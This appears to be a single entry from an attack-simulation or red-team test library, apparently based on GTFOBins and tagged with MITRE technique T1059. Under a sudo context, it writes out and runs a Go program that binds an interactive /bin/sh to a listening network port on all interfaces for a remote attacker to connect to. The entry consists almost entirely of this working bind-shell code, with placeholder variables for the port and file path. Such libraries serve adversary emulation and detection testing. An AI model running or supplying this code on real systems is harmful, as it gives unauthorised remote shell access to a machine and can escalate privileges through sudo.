scripts.name: GTFOBINS - T1059 - go - Bind shell - Sudo [8eb4a98]
scripts.description: This executable can bind a system shell to a local port waiting for an attacker to connect. Binary: go. Context: Sudo.
scripts.command:
echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: #{lotl_gtfobins_remote_port}}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >#{lotl_gtfobins_local_path}.go
go run #{lotl_gtfobins_local_path}.go
